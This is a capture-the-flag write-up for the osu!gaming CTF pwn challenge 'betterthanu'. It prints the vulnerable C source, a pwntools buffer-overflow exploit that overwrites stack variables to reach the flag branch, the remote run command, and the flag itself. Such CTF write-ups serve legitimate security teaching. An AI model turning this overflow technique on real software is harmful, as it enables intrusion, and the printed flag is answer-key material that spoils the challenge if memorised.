# osu!gaming CTF > pwn > betterthanu

The binary comprises **two** user inputs, one prompting the user to input their earned `pp` and the other asking for any **"last words"**. Both inputs are stored in the character array `char buf[16]`. Subsequently, the binary calculates the value of `pp` as the user-provided value plus 1.

In the initial `if` statement, the program checks if the calculated value `my_pp` (which is the input value of `pp` + 1) is not **greater** than the original user-provided `pp`. If this condition is not met, it proceeds to another `if` statement. Here, it verifies whether the user-entered value of `pp` is exactly `727`. If this condition is satisfied, the program prints the flag.

The C code of the binary challenge:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

FILE *flag_file;
char flag[100];

int main(void) {
    unsigned int pp;
    unsigned long my_pp;
    char buf[16];

    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    printf("How much pp did you get? ");
    fgets(buf, 100, stdin);
    pp = atoi(buf);

    my_pp = pp + 1;

    printf("Any last words?\n");
    fgets(buf, 100, stdin);

    if (pp <= my_pp) {
        printf("Ha! I got %d\n", my_pp);
        printf("Maybe you'll beat me next time\n");
    } else {
        printf("What??? how did you beat me??\n");
        printf("Hmm... I'll consider giving you the flag\n");

        if (pp == 727) {
            printf("Wait, you got %d pp?\n", pp);
            printf("You can't possibly be an NPC! Here, have the flag: ");

            flag_file = fopen("flag.txt", "r");
            fgets(flag, sizeof(flag), flag_file);
            printf("%s\n", flag);
        } else {
            printf("Just kidding!\n");
        }
    }

    return 0;
}
```

The goal is to control the values compared in both `if` statements, overwriting the values in the stack via a **buffer overflow**.

### Exploit
```python
#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw, env={"LD_PRELOAD": "/bin/bash"})
    elif args.REMOTE: # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
'''.format(**locals())

exe = "./challenge"
elf = context.binary = ELF(exe, checksec=False)

io = start()
io.sendline(b"foo")

offset = 16
payload = flat({
    offset: [
        b'\x00' * 12, 
        p32(0x02d7)  
    ]
})

io.sendline(payload)

io.recvuntil(b"Wait, you got 727 pp?\n")
flag_line = io.recvline().decode().strip()
start_index = flag_line.find("osu{")

flag = flag_line[start_index:]
log.success(f"Flag: {flag}")
```

In order to run the exploit and get the actual flag, we can pass the remote server and port as `REMOTE` arguments in the same script, as the pwntools template enables us to do (i.e. `python3 solve.py REMOTE chal.osugaming.lol 7279`)

Flag: `osu{i_cant_believe_i_saw_it}`
